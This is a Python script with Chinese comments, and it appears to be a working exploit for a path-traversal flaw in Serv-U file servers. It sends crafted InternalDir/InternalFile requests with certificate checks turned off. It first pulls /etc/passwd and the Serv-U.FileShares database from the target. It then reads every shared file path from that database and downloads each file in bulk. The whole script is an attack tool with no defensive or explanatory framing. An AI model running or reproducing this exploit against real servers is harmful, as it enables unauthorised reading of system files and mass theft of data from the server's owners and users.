import argparse
import requests
import os
import sqlite3
from tenacity import retry, stop_after_attempt, wait_fixed, after_log, RetryError
import logging

# 忽略不安全的请求警告
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# 配置日志记录
logging.basicConfig(filename='failed_requests.log', level=logging.ERROR)

# 定义重试机制，最多重试 5 次，每次间隔 2 秒
@retry(stop=stop_after_attempt(5), wait=wait_fixed(2), after=after_log(logging.getLogger(), logging.ERROR))
def download_file(url, target_dir, internal_dir, internal_file):
    full_url = f"{url}/?InternalDir={internal_dir}&InternalFile={internal_file}"
    save_path = os.path.join(target_dir, internal_file)

    # 检查文件是否已存在
    if os.path.exists(save_path):
        print(f"文件已存在，跳过下载: {save_path}")
        return

    print(f"请求URL: {full_url}")
    response = requests.get(full_url, verify=False)
    response.raise_for_status()  # Raise an HTTPError for bad responses

    # 确保目标目录存在
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    with open(save_path, "wb") as file:
        file.write(response.content)
    print(f"文件 {save_path} 保存成功")

def process_dir_file(url, dir_file_path, target_dir):
    try:
        with open(dir_file_path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                original_path = line.strip()
                if original_path:  # 确保非空行
                    path_parts = original_path.split('/')
                    internal_file = path_parts[-1]
                    internal_dir = os.path.normpath('/'.join(['..'] * (len(path_parts) - 1) + path_parts[:-1])).replace('/', '\\')
                    try:
                        download_file(url, target_dir, internal_dir, internal_file)
                    except RetryError as e:
                        logging.error(f"请求失败: {url}/?InternalDir={internal_dir}&InternalFile={internal_file}")
    except UnicodeDecodeError:
        print(f"使用 UTF-8 编码解码失败，尝试使用 ASCII 编码")
        with open(dir_file_path, 'r', encoding='ascii', errors='ignore') as file:
            for line in file:
                original_path = line.strip()
                if original_path:  # 确保非空行
                    path_parts = original_path.split('/')
                    internal_file = path_parts[-1]
                    internal_dir = os.path.normpath('/'.join(['..'] * (len(path_parts) - 1) + path_parts[:-1])).replace('/', '\\')
                    try:
                        download_file(url, target_dir, internal_dir, internal_file)
                    except RetryError as e:
                        logging.error(f"请求失败: {url}/?InternalDir={internal_dir}&InternalFile={internal_file}")

def read_fullpath_from_db(db_path, output_file):
    # 连接到SQLite数据库
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    # 查询ad_hoc_files表中的FullPath列
    cursor.execute("SELECT FullPath FROM ad_hoc_files")

    # 获取所有结果
    rows = cursor.fetchall()

    # 将FullPath列的内容保存到文件中
    with open(output_file, 'w', encoding='utf-8') as file:
        for row in rows:
            file.write(row[0] + '\n')

    # 关闭数据库连接
    conn.close()
    print(f"文件保存成功: {output_file}")

def main():
    parser = argparse.ArgumentParser(description="Download files from a specified URL and process paths from a SQLite database.")
    parser.add_argument('-u', '--url', required=True, help="目标 URL")

    args = parser.parse_args()

    # 确保URL格式正确
    if args.url.endswith('/'):
        url = args.url[:-1]
    else:
        url = args.url

    # 创建目标目录
    target_dir = url.split('//')[-1].split('/')[0]
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    # 下载passwd文件
    passwd_internal_dir = '..\\..\\..\\..\\etc'
    passwd_internal_file = 'passwd'
    try:
        download_file(url, target_dir, passwd_internal_dir, passwd_internal_file)
    except RetryError as e:
        logging.error(f"请求失败: {passwd_internal_dir}\\{passwd_internal_file}")

    # 下载Serv-U.FileShares文件
    internal_dir = '..\\Shares\\'
    internal_file = 'Serv-U.FileShares'
    try:
        download_file(url, target_dir, internal_dir, internal_file)
    except RetryError as e:
        logging.error(f"请求失败: {internal_dir}\\{internal_file}")

    # 读取SQLite数据库并保存FullPath列内容到filepath.txt
    db_path = os.path.join(target_dir, 'Serv-U.FileShares')
    output_file = os.path.join(target_dir, 'filepath.txt')
    read_fullpath_from_db(db_path, output_file)

    # 处理filepath.txt中的路径
    process_dir_file(url, output_file, target_dir)

if __name__ == "__main__":
    main()
